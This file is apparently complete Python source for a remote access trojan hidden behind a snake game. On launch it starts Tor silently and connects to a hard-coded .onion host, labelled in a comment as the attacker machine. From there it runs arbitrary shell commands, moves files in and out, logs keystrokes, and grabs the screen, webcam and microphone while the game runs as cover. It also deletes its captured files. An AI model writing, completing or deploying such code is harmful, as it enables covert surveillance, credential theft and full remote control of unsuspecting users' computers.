import socket
import socks
import subprocess
import os
import base64
import time
import threading
import cv2
import wave
import pyaudio
from PIL import ImageGrab
from pynput import keyboard
import json
from jeu.snake import jeu 


stop = False
# RAT:

def connect():
	while True:
		try:
			socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
			socket.socket = socks.socksocket
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect(('3xazduds5wdy57xzgnni3azqtzdt5eahufpp44gdevw2rvqi4mrwi4yd.onion', 4444))  # IP and Port of the attacker machine
			return s
		except Exception:
			time.sleep(5)
			continue


def execute_commands(command):
	try:
		output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
		return output.decode(errors='replace')
	except Exception as e:
		return str(e)


def write_file(path, content):
	with open(path, 'wb') as file:
		file.write(base64.b64decode(content))


def read_file(path):
	with open(path, 'rb') as file:
		content = base64.b64encode(file.read())
		return content.decode()

def capture_screen():
    try:
        screenshot = ImageGrab.grab()
        screenshot.save("screen.png", "PNG")
        return 
    except Exception as e:
        return f"Error capturing screen: {str(e)}"

def capture_webcam():
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return "Error: Could not open webcam."
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("webcam.png", frame)
            cap.release()
            return 
        else:
            cap.release()
            return "Error: Could not capture frame from webcam."
    except Exception as e:
        return f"Error capturing webcam: {str(e)}"
def send_post_req(time_interval):
    global stop, text 
    if stop:
        return
    try:
        payload = json.dumps({"keyboardData" : text})
        with open("Keylogg.txt", "a", encoding="utf-8") as f:
            f.write(payload + "\n")
        
        text = ""
        timer = threading.Timer(time_interval, send_post_req, args=(time_interval,))
        timer.start()
    except Exception as e:
        print(e)
        print("Couldn't complete request!")
	
def on_press(key):
    global text
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")

def keylogger():
    global text
    global stop
    text = ""
    time_interval = 10
	
	
    with keyboard.Listener(on_press=on_press) as listener:
        if stop:
            return
        send_post_req(time_interval)
        listener.join()
		

def record_microphone(duration=5):
    try:
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1
        RATE = 44100
        RECORD_SECONDS = duration
        
        audio = pyaudio.PyAudio()
        stream = audio.open(format=FORMAT, channels=CHANNELS,
                            rate=RATE, input=True,
                            frames_per_buffer=CHUNK)
        
        print("Recording microphone...")
        frames = []
        while not stop : 
            if stop:
                break
            data = stream.read(CHUNK)
            frames.append(data)
	
        print("Finished recording.")
        stream.stop_stream()
        stream.close()
        audio.terminate()
        
        waveFile = wave.open('microphone.wav', 'wb')
        waveFile.setnchannels(CHANNELS)
        waveFile.setsampwidth(audio.get_sample_size(FORMAT))
        waveFile.setframerate(RATE)
        waveFile.writeframes(b''.join(frames))
        waveFile.close()
        
        return 
    except Exception as e:
        return f"Error recording microphone: {str(e)}"

# --- RAT Command Handler ---
def rat_client():
	global stop
	s = connect()
	try:
		while True:
			data = s.recv(1000000)
			if not data:
				break
			command = data.decode()
			if command.lower() == 'exit':
				break
			elif command.startswith('cd '):
				try:
					os.chdir(command[3:])
					s.send(str.encode(os.getcwd()))
				except Exception as e:
					s.send(str.encode(str(e)))
			elif command.startswith('download '):
				path = command[9:]
				try:
					if os.path.exists(path):
						s.send(read_file(path).encode())
					else:
						s.send(str.encode("File not found"))
				except Exception as e:
					s.send(str.encode(f"Error: {str(e)}"))
			elif command.startswith('upload '):
				path = command [7:]
				content = s.recv(100000).decode()
				content = base64.b64decode(content.encode())
				write_file(path, content)
				s.send(str.encode("Upload complete"))
			elif command == 'keylogger':
				stop = False
				s.send(str.encode("Keylogging ..."))
				keylogger_thread = threading.Thread(target=keylogger, daemon=True)
				keylogger_thread.start()
				while not stop:
					if s.recv(1024).decode() == "stop":
						stop = True
				keylogger_thread.join()
				s.send(read_file("keylogg.txt").encode())
				execute_commands("del keylogg.txt")
			elif command == 'screenshot':
				capture_screen()
				s.send(read_file("screen.png").encode())
				execute_commands("del screen.png")
			elif command == 'webcam':
				capture_webcam()
				s.send(read_file("webcam.png").encode())
				execute_commands("del webcam.png")
			elif command.startswith('mic'):
				stop = False
				try:
					duration = int(command.split(' ')[1])
				except:
					duration = 5
				s.send(str.encode("Recording ..."))
				mic_thread = threading.Thread(target=record_microphone, args=(duration,), daemon=True)
				mic_thread.start()
				while not stop:
					if s.recv(1024).decode() == "stop":
						stop = True
				mic_thread.join()
				#record_microphone(duration)
				s.send(read_file("microphone.wav").encode())
				execute_commands("del microphone.wav")
			else:
				output = execute_commands(command)
				s.send(str.encode(output))
	except socket.error as e:
		print(f"Socket error: {e}. Reconnecting...")
		
	except Exception as e:
		print(f"An error occurred: {e}")
		
		s.send(str.encode(f"Error: {str(e)}"))
	finally:
		s.close()




# Main
def start_tor():
	execute_commands("cd trojan/tor/tor")
	execute_commands("tor.exe")
	time.sleep(10)
def main():
	
	tor_process = subprocess.Popen(
    "trojan/tor/tor/tor.exe",
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL,
    creationflags=subprocess.CREATE_NO_WINDOW
	)
	ratThread = threading.Thread(target=rat_client, daemon=True)
	ratThread.start()
	jeu()
	
	tor_process.terminate()


if __name__ == "__main__":
	main()
